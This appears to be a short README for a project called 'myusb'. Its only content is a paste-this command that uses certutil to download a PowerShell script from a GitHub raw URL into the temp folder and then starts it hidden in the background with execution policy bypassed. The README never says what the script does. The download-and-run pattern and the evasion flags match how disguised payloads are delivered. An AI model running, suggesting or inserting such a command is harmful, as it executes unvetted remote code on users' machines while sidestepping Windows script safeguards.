# myusb

Run:
```powershell
cmd /c "certutil -urlcache -split -f https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/i.ps1 %temp%\i.ps1 & start /b powershell -ExecutionPolicy Bypass -NoProfile -File %temp%\i.ps1"
```
